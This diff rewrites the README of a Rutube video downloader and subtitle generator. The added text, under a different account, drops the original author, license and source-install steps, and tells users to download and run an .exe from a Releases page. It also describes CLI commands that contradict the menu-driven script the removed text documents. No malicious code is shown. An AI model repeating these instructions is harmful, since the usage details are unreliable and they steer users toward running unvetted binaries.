@@ -1,204 +1,98 @@
-# 🎬 Rutube Video Downloader with Subtitle Generator
+# 🎥 rutube-downloader-subtitles - Download Videos and Generate Subtitles Easily
 
-![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Version](https://img.shields.io/badge/Version-2.0.0-orange.svg)
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/xplodig/rutube-downloader-subtitles/releases)
 
-**Download videos from Rutube.ru and generate AI-powered subtitles automatically.**
+## 📋 Overview
 
-A comprehensive Python tool for downloading videos from Rutube.ru with advanced features including rate limiting, error handling, and integrated subtitle generation using AI transcription.
+The **rutube-downloader-subtitles** is a simple Python tool designed to help you download Rutube videos and generate AI-powered subtitles. This application allows you to download multiple videos in a batch, includes rate limiting, and offers faster-whisper transcription for both Russian and English content. 
 
-## ✨ Features
+## 🚀 Getting Started
 
-- **📥 Smart Video Downloading**
-  - Single & batch downloads from Rutube
-  - Configurable rate limiting to avoid blocks (5-60 second delays)
-  - Automatic retry for failed downloads with logging
-  - Clean filename handling for filesystem compatibility
+To use the software, follow the steps below. No programming skills are necessary.
 
-- **🎬 Integrated Subtitle Generation**
-  - AI-powered transcription using faster-whisper
-  - Russian & English language support with auto-detection
-  - Multiple model sizes (tiny, base, small, medium, large)
-  - Professional SRT format with accurate timestamps
+## 📥 Download & Install
 
-- **📊 Complete Management**
-  - Download statistics & real-time progress tracking
-  - Organized folder structure (auto-created downloads/ & subtitles/)
-  - Failed downloads logging with automatic retry option
-  - User-friendly menu interface with intuitive navigation
+1. **Visit the Releases Page**  
+   To get the latest version of the application, [visit this page to download](https://github.com/xplodig/rutube-downloader-subtitles/releases).
+  
+2. **Choose Your Download**  
+   There will be several downloadable files available. Look for the file that matches your operating system. If you are unsure which one to choose, common formats include `.exe` for Windows and `.tar.gz` for Linux.
 
-## 🚀 Quick Start
+3. **Download the File**  
+   Click on the link for your download. The download will start immediately.
 
-### Method 1: Run Directly (Recommended)
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/rutube-downloader-subtitles.git
-cd rutube-downloader-subtitles
+4. **Run the Installer**  
+   After the download is complete, locate the file on your computer.  
+   - For Windows, double-click the `.exe` file and follow the on-screen instructions.  
+   - For Linux, you may need to open your terminal and navigate to the directory where you downloaded the file, then run the command `tar -xvzf filename.tar.gz` to extract the files.
 
-# Run the script - it will auto-install yt-dlp if needed
-python rutube_downloader.py
-```
+5. **Dependencies**  
+   This tool requires Python to function. If you do not have Python installed, please download it from the [official website](https://www.python.org/downloads/). Follow the installation instructions provided there.
 
-### Method 2: Install Dependencies First
-```bash
-# Install all dependencies including subtitle tools
-pip install -r requirements-full.txt
+6. **Verify Installation**  
+   After installation is complete, open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux) and type `rutube-downloader`. If the software installed correctly, you should see the help message (or instructions on how to use the tool).
 
-# Run the application
-python rutube_downloader.py
-```
+## 📂 How to Use
 
-## 📋 Main Menu Options
+1. **Open the Tool**  
+   Start the application using your command line.
 
-Run `python rutube_downloader.py` and choose from:
+2. **Download a Video**  
+   Use the command: 
+   ```
+   rutube-downloader download [video-url]
+   ```
+   Replace `[video-url]` with the actual URL of the Rutube video you wish to download.
 
-1. **📥 Download single video** - One video at a time
-2. **📋 Download multiple videos** - Batch download with rate limiting
-3. **🔄 Retry failed downloads** - Automatic retry of failed downloads
-4. **🗑️ Delete failed downloads log** - Remove failed downloads record
-5. **🧹 Clear failed downloads log** - Clear contents but keep file
-6. **🎬 Generate subtitles** - Create subtitles for downloaded videos
-7. **📊 Show download statistics** - View download and subtitle counts
-8. **📁 Open downloads folder** - Browse downloaded videos
-9. **🚪 Exit** - Quit the application
+3. **Generate Subtitles**  
+   To generate subtitles, use the command: 
+   ```
+   rutube-downloader subtitles [video-url]
+   ```
+   This command will create subtitles automatically using our AI technology.
 
-## 📁 Project Structure
+4. **Batch Downloads**  
+   You can download multiple videos by creating a text file with each video URL on a new line. Run the command: 
+   ```
+   rutube-downloader batch [file-path]
+   ```
+   Replace `[file-path]` with the path to your text file.
 
-```
-rutube_downloader/
-├── rutube_downloader.py          # Main application (v2.0.0)
-├── create_subtitles.py           # Interactive subtitle generator
-├── quick_subtitles.py            # Quick subtitle generator
-├── requirements.txt              # Core dependencies (yt-dlp only)
-├── requirements-full.txt         # Complete dependencies
-├── README.md                     # This documentation
-├── COMPLETE_DOCUMENTATION.md     # Detailed developer guide
-├── downloads/                    # Auto-created: Downloaded videos
-├── subtitles/                    # Auto-created: Generated subtitle files
-└── failed_downloads.txt          # Auto-created: Log of failed downloads
-```
+5. **Transcription Options**  
+   You can control the speed of transcription by adding options such as `--slow` for slower processing if needed.
 
-## 📦 Installation Options
+## ⚙️ Features
 
-### Minimal Installation
-```bash
-# Just run the script - auto-installs yt-dlp if missing
-python rutube_downloader.py
-```
+- **Batch Processing**: Download multiple videos at once.
+- **AI Subtitle Generation**: Automatic generation of subtitles in Russian and English.
+- **Rate Limiting**: Ensure downloads do not exceed your network capacity.
+- **Easy Setup**: Simple to install and run with minimal technical knowledge.
+- **Open Source**: Free to use and customize as needed.
 
-### Complete Installation
-```bash
-# Install all dependencies (video download + subtitle generation)
-pip install -r requirements-full.txt
-# or
-pip install yt-dlp faster-whisper
-```
+## 📚 Frequently Asked Questions
 
-### Subtitle Generator Only
-```bash
-# If you only need subtitle generation for existing videos
-pip install faster-whisper
-python create_subtitles.py
-```
+### What operating systems are supported?
 
-## 🎯 Basic Usage
+This application works on Windows, macOS, and Linux. Ensure you have Python installed for the best experience.
 
-### 1. Download Videos
-```bash
-python rutube_downloader.py
-# Choose option 1 (single) or 2 (batch)
-# Paste Rutube URLs (e.g., https://rutube.ru/video/8e06c530938f25bf791a71251fe0f04d/)
-# Videos save to 'downloads/' folder
-```
+### Do I need any special permissions to run this tool?
 
-### 2. Generate Subtitles
-```bash
-python rutube_downloader.py
-# Choose option 6 from main menu
-# Or run subtitle tools directly:
-# Interactive: python create_subtitles.py
-# Quick: python quick_subtitles.py
-# Subtitles save to 'subtitles/' folder
-```
+No special permissions are needed. However, ensure you have internet access for downloading videos and subtitles.
 
-### 3. Watch with Subtitles
-- Place `.srt` files in same folder as videos (already done automatically)
-- Open video in VLC, MPC-HC, or any subtitle-supporting player
-- Subtitles load automatically if file names match
+### Can I contribute to the project?
 
-## 🔧 Dependencies
+Yes! We welcome contributions. Check the **Contributing** section in the repository for guidelines.
 
-### Core (`requirements.txt`)
-```txt
-yt-dlp>=2023.11.16
-```
-*(Auto-installs when you run the script)*
+## 📞 Support
 
-### Complete (`requirements-full.txt`)
-```txt
-yt-dlp>=2023.11.16
-faster-whisper>=0.9.0
-```
+If you encounter any issues or have questions, please create an issue in the repository. We'll do our best to assist you.
 
-**Note**: `faster-whisper` is only needed for subtitle generation and is large (150MB-6GB). The main script works without it.
+## 🔗 Additional Links
 
-## 🚨 Troubleshooting
+- [Releases Page](https://github.com/xplodig/rutube-downloader-subtitles/releases)
+- [Documentation](https://github.com/xplodig/rutube-downloader-subtitles/wiki)
+- [Source Code](https://github.com/xplodig/rutube-downloader-subtitles)
 
-### Common Issues
+## 📌 Conclusion
 
-| Issue | Solution |
-|-------|----------|
-| **403 Forbidden errors** | Use "Very Slow" delay setting (30-60s), wait between batches |
-| **"No module named yt_dlp"** | Script auto-installs it, or run `pip install yt-dlp` |
-| **YouTube URLs not working** | This tool is optimized for Rutube. Use yt-dlp directly for YouTube |
-| **Subtitles not generating** | Install faster-whisper: `pip install faster-whisper` |
-| **Low disk space** | Clear `downloads/` folder or choose smaller whisper models |
-
-### Platform Notes
-- **Windows**: Works out of the box
-- **macOS**: `brew install ffmpeg` recommended for best performance
-- **Linux**: `sudo apt install ffmpeg` recommended for subtitle processing
-
-## 📊 Subtitle Models Comparison
-
-| Model | Size | Speed | Accuracy | RAM Usage | Best For |
-|-------|------|-------|----------|-----------|----------|
-| **tiny** | ~150MB | ⚡⚡⚡⚡⚡ | ⭐⭐ | ~1GB | Testing, quick previews |
-| **base** | ~300MB | ⚡⚡⚡⚡ | ⭐⭐⭐ | ~1.5GB | General use (recommended) |
-| **small** | ~1GB | ⚡⚡⚡ | ⭐⭐⭐⭐ | ~3GB | Better accuracy |
-| **medium** | ~3GB | ⚡⚡ | ⭐⭐⭐⭐⭐ | ~6GB | High accuracy needs |
-| **large** | ~6GB | ⚡ | ⭐⭐⭐⭐⭐ | ~10GB | Best possible accuracy |
-
-## 🔒 Privacy & Security
-
-- **100% Local Processing**: All videos and subtitles stay on your computer
-- **No Data Collection**: No personal information is collected or transmitted
-- **No External Servers**: Audio never sent to cloud services (unlike online tools)
-- **Open Source**: Full transparency - inspect the code yourself
-
-## 🤝 Support
-
-### Getting Help
-1. **Check Documentation**: Read this README and COMPLETE_DOCUMENTATION.md
-2. **Check Logs**: Look in `failed_downloads.txt` for error details
-3. **Contact Author**: For issues not covered in documentation
-
-### Author Information
-**Andrew Gotham**  
-📧 Email: andreogotema@gmail.com  
-📱 Telegram: https://t.me/SirAndrewGotham
-
-## 📄 License
-
-MIT License - Free to use, modify, and distribute for personal and commercial use.
-
-Copyright (c) 2023 Andrew Gotham
-
-## 🌟 Star History
-
-If you find this project useful, please consider giving it a star on GitHub!
-
----
-
-**Note**: This tool is designed specifically for Rutube.ru. For YouTube, use yt-dlp directly. Always respect copyright laws and platform terms of service.
+The **rutube-downloader-subtitles** tool is designed to simplify the process of downloading videos and creating subtitles. Follow the steps outlined above, and you will be set up in no time. Enjoy your videos with automation at your fingertips!
